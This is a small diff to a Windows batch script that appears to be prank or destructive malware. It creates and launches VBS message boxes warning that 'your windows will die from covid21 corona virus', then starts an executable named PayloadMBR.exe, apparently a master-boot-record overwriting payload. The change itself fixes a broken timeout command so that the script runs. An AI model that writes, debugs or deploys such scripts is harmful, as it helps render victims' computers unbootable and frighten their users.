@@ -37,5 +37,5 @@ start corona.vbs
 timeout 5 /nobreak
 echo msgbox "your windows will die from covid21 corona virus" >covid21.vbs
 start covid21.vbs
-timeout /3 /nobreak
+timeout 3 /nobreak
 start PayloadMBR.exe
